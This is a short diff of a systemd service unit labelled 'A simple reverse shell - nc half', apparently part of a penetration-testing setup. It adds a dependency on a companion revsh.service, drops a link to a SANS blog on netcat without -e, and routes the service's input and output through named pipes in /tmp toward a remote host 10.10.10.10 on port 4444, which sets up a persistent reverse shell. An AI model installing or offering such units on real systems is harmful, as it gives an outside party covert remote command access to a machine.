@@ -1,10 +1,10 @@
 ; https://www.freedesktop.org/software/systemd/man/systemd.service.html
 [Unit]
 Description=A simple reverse shell - nc half
+Requires=revsh.service
 
 [Service]
 Type=simple
-; https://pen-testing.sans.org/blog/2013/05/06/netcat-without-e-no-problem/
 StandardInput=file:/tmp/frontpipe
 StandardOutput=file:/tmp/backpipe
 Environment=RHOST="10.10.10.10" RPORT="4444"
